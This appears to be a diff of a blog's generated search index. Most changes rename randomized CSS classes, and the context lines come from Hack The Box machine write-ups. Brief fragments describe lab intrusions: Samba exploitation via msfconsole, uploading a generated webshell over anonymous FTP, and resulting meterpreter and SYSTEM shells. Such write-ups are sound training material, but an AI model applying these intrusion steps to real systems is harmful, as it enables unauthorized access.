-    <content><![CDATA[<style>.argutzgmhmiv{zoom:50%;}</style><img src="/posts/c3392160/4ef1ea77e69185063d4200d7d0142baa.png" class="argutzgmhmiv">
+    <content><![CDATA[<style>.vwkhqtuyjilc{zoom:50%;}</style><img src="/posts/c3392160/4ef1ea77e69185063d4200d7d0142baa.png" class="vwkhqtuyjilc">
 
 <span id="more"></span>
 
@@ -2955,7 +3215,7 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
   <entry>
     <title>HTB-Blocky</title>
     <url>/posts/1cdd7a67.html</url>
-    <content><![CDATA[<style>.xrsojbfnnqlu{zoom:50%;}</style><img src="/posts/1cdd7a67/f412784c311bdf52c3655381d2c9cd21.png" class="xrsojbfnnqlu">
+    <content><![CDATA[<style>.hxsnzpfmdqfq{zoom:50%;}</style><img src="/posts/1cdd7a67/f412784c311bdf52c3655381d2c9cd21.png" class="hxsnzpfmdqfq">
 
 <span id="more"></span>
 
@@ -3102,7 +3362,7 @@ root@Blocky:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Remote</title>
     <url>/posts/685379b3.html</url>
-    <content><![CDATA[<style>.dngaoyhdwbrl{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="dngaoyhdwbrl">
+    <content><![CDATA[<style>.zntmpmdoqfcn{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="zntmpmdoqfcn">
 
 <span id="more"></span>
 
@@ -3343,7 +3603,7 @@ meterpreter <span class="token operator">></span>
   <entry>
     <title>HTB-Love</title>
     <url>/posts/e5f5ab78.html</url>
-    <content><![CDATA[<style>.ujowrubjdsyw{zoom:50%;}</style><img src="/posts/e5f5ab78/c00774d8d806b82c709c596937a92d14.png" class="ujowrubjdsyw">
+    <content><![CDATA[<style>.ibmrsfaxygvm{zoom:50%;}</style><img src="/posts/e5f5ab78/c00774d8d806b82c709c596937a92d14.png" class="ibmrsfaxygvm">
 
 <span id="more"></span>
 
@@ -3551,7 +3811,7 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
   <entry>
     <title>HTB-BountyHunter</title>
     <url>/posts/d750c67f.html</url>
-    <content><![CDATA[<style>.snpkstwzwtpk{zoom:50%;}</style><img src="/posts/d750c67f/a24c032885e56a17a6c74cc58b63e8f4.png" class="snpkstwzwtpk">
+    <content><![CDATA[<style>.vcmponsbjrfl{zoom:50%;}</style><img src="/posts/d750c67f/a24c032885e56a17a6c74cc58b63e8f4.png" class="vcmponsbjrfl">
 
 <span id="more"></span>
 
@@ -3740,7 +4000,7 @@ __Ticket Code:__
   <entry>
     <title>HTB-DevOops</title>
     <url>/posts/ddc47498.html</url>
-    <content><![CDATA[<style>.ufgeckumhiye{zoom:50%;}</style><img src="/posts/ddc47498/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="ufgeckumhiye">
+    <content><![CDATA[<style>.ijsjfxgppsgw{zoom:50%;}</style><img src="/posts/ddc47498/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="ijsjfxgppsgw">
 
 <span id="more"></span>
 
@@ -4046,8 +4306,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <img src="/posts/e4955058/DraggedImage-10.png" class="" title="webapps">
 <p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
 <img src="/posts/e4955058/DraggedImage-11.png" class="">
-<style>.hnvrskyybvbf{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-12.png" class="hnvrskyybvbf" alt="修改配置">
-<style>.lmmicqocklcd{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-13.png" class="lmmicqocklcd">
+<style>.vophsxiyhmtk{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-12.png" class="vophsxiyhmtk" alt="修改配置">
+<style>.gtgeeyrykhxx{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-13.png" class="gtgeeyrykhxx">
 
 <h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgwL3NzYy8=">http://127.0.0.1:8080/ssc/<i class="fa fa-external-link-alt"></i></span></p>
 <img src="/posts/e4955058/DraggedImage-14.png" class="" title="访问SSC">
@@ -4084,7 +4344,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Jerry</title>
     <url>/posts/4797133e.html</url>
-    <content><![CDATA[<style>.hfuhxetaoaom{zoom:50%;}</style><img src="/posts/4797133e/59f03a24178dbb2bdc94968c201e21f8.png" class="hfuhxetaoaom">
+    <content><![CDATA[<style>.jvwbhaqiqxcq{zoom:50%;}</style><img src="/posts/4797133e/59f03a24178dbb2bdc94968c201e21f8.png" class="jvwbhaqiqxcq">
 
 <span id="more"></span>
 
@@ -4144,7 +4404,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Blue</title>
     <url>/posts/2c4131d1.html</url>
-    <content><![CDATA[<style>.iumnezfgiied{zoom:50%;}</style><img src="/posts/2c4131d1/52e077ae40899ab8b024afd51cb29b1c.png" class="iumnezfgiied">
+    <content><![CDATA[<style>.mcktjbhoglaq{zoom:50%;}</style><img src="/posts/2c4131d1/52e077ae40899ab8b024afd51cb29b1c.png" class="mcktjbhoglaq">
 
 <span id="more"></span>
 
@@ -4194,7 +4454,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Knife</title>
     <url>/posts/872a7a04.html</url>
-    <content><![CDATA[<style>.kdfvtqgpivrt{zoom:50%;}</style><img src="/posts/872a7a04/110fe6608793064cf171080150ebd0dc.png" class="kdfvtqgpivrt">
+    <content><![CDATA[<style>.dofyejpqwkao{zoom:50%;}</style><img src="/posts/872a7a04/110fe6608793064cf171080150ebd0dc.png" class="dofyejpqwkao">
 
 <span id="more"></span>
 
@@ -4261,7 +4521,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Shocker</title>
     <url>/posts/38c5e2d.html</url>
-    <content><![CDATA[<style>.cdsrjhmsvvso{zoom:50%;}</style><img src="/posts/38c5e2d/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="cdsrjhmsvvso">
+    <content><![CDATA[<style>.imqdsmobtqit{zoom:50%;}</style><img src="/posts/38c5e2d/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="imqdsmobtqit">
 
 <span id="more"></span>
 
@@ -4321,7 +4581,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Tenten</title>
     <url>/posts/78c78349.html</url>
-    <content><![CDATA[<style>.knfjswfvxxzb{zoom:50%;}</style><img src="/posts/78c78349/e58a465e93364c423cd2162945f8f7bf.png" class="knfjswfvxxzb">
+    <content><![CDATA[<style>.ksdrevgkoozk{zoom:50%;}</style><img src="/posts/78c78349/e58a465e93364c423cd2162945f8f7bf.png" class="ksdrevgkoozk">
 
 <span id="more"></span>
 
@@ -4401,7 +4661,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Bastard</title>
     <url>/posts/7134392b.html</url>
-    <content><![CDATA[<style>.ptrotosrpchi{zoom:50%;}</style><img src="/posts/7134392b/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="ptrotosrpchi">
+    <content><![CDATA[<style>.crjkjcjmkbqt{zoom:50%;}</style><img src="/posts/7134392b/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="crjkjcjmkbqt">
 
 <span id="more"></span>
 
@@ -4476,7 +4736,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Granny</title>
     <url>/posts/6b0d212.html</url>
-    <content><![CDATA[<style>.ninuosyunnsb{zoom:50%;}</style><img src="/posts/6b0d212/e8a122e2d713a4fb4a180bb9ccd20248.png" class="ninuosyunnsb">
+    <content><![CDATA[<style>.dtkstkogjtts{zoom:50%;}</style><img src="/posts/6b0d212/e8a122e2d713a4fb4a180bb9ccd20248.png" class="dtkstkogjtts">
 
 <span id="more"></span>
 
@@ -4535,7 +4795,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Grandpa</title>
     <url>/posts/c75d4146.html</url>
-    <content><![CDATA[<style>.vdttpuqhrzyh{zoom:50%;}</style><img src="/posts/c75d4146/381683fd107da11f1dc916401ae8aee0.png" class="vdttpuqhrzyh">
+    <content><![CDATA[<style>.bazemgtkoect{zoom:50%;}</style><img src="/posts/c75d4146/381683fd107da11f1dc916401ae8aee0.png" class="bazemgtkoect">
 
 <span id="more"></span>
 
@@ -4595,7 +4855,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Arctic</title>
     <url>/posts/d972b09f.html</url>
-    <content><![CDATA[<style>.dgrhjmonseob{zoom:50%;}</style><img src="/posts/d972b09f/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="dgrhjmonseob">
+    <content><![CDATA[<style>.uinunyesgruc{zoom:50%;}</style><img src="/posts/d972b09f/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="uinunyesgruc">
 
 <span id="more"></span>
 
@@ -4668,7 +4928,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Legacy</title>
     <url>/posts/252e0fef.html</url>
-    <content><![CDATA[<style>.tlovyxxdqngc{zoom:50%;}</style><img src="/posts/252e0fef/60dc190c4c015cfe3a3aef9b5afca254.png" class="tlovyxxdqngc">
+    <content><![CDATA[<style>.eplggsnpbiqc{zoom:50%;}</style><img src="/posts/252e0fef/60dc190c4c015cfe3a3aef9b5afca254.png" class="eplggsnpbiqc">
 
 <span id="more"></span>
 
@@ -4716,7 +4976,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Devel</title>
     <url>/posts/97f065fe.html</url>
-    <content><![CDATA[<style>.dzqdkwgyfrtg{zoom:50%;}</style><img src="/posts/97f065fe/0fb6455a29eb4f2682f04a780ce26cb1.png" class="dzqdkwgyfrtg">
+    <content><![CDATA[<style>.ognjqldvvadt{zoom:50%;}</style><img src="/posts/97f065fe/0fb6455a29eb4f2682f04a780ce26cb1.png" class="ognjqldvvadt">
 
 <span id="more"></span>
 
@@ -4735,7 +4995,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/posts/97f065fe/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.ybfyldgbbimw{zoom:150%;}</style><img src="/posts/97f065fe/image-20250201213757511.png" class="ybfyldgbbimw" alt="登录FTP">
+<style>.immdhydknmho{zoom:150%;}</style><img src="/posts/97f065fe/image-20250201213757511.png" class="immdhydknmho" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/posts/97f065fe/image-20250201215256322.png" class="" title="生成webshell">
@@ -4777,7 +5037,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Lame</title>
     <url>/posts/465d4de8.html</url>
-    <content><![CDATA[<style>.vjfecmrsjioa{zoom:50%;}</style><img src="/posts/465d4de8/fb2d9f98400e3c802a0d7145e125c4ff.png" class="vjfecmrsjioa">
+    <content><![CDATA[<style>.wfbrbttgsppr{zoom:50%;}</style><img src="/posts/465d4de8/fb2d9f98400e3c802a0d7145e125c4ff.png" class="wfbrbttgsppr">
 
 <span id="more"></span>
 
@@ -4793,11 +5053,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.ioxlwotjukpw{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201155450222.png" class="ioxlwotjukpw" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.ykfgxrwkcvjp{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201155450222.png" class="ykfgxrwkcvjp" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/posts/465d4de8/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.zqurqptktjdc{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201174838005.png" class="zqurqptktjdc" alt="msfconsole">
+<style>.lvefgfkoayfp{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201174838005.png" class="lvefgfkoayfp" alt="msfconsole">
 
 <img src="/posts/465d4de8/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -4830,7 +5090,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Optimum</title>
     <url>/posts/f7bd0d80.html</url>
-    <content><![CDATA[<style>.fgyrwfcuhkfj{zoom:50%;}</style><img src="/posts/f7bd0d80/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="fgyrwfcuhkfj">
+    <content><![CDATA[<style>.efkjvclpkcfo{zoom:50%;}</style><img src="/posts/f7bd0d80/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="efkjvclpkcfo">
 
 <span id="more"></span>
 
@@ -4892,7 +5152,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Beep</title>
     <url>/posts/48ffce4.html</url>
-    <content><![CDATA[<style>.tqhfxcdtyhqr{zoom:50%;}</style><img src="/posts/48ffce4/995f465295b99869fce21ecadea4604c.png" class="tqhfxcdtyhqr">
+    <content><![CDATA[<style>.fauarukzumkl{zoom:50%;}</style><img src="/posts/48ffce4/995f465295b99869fce21ecadea4604c.png" class="fauarukzumkl">
 
 <span id="more"></span>
 
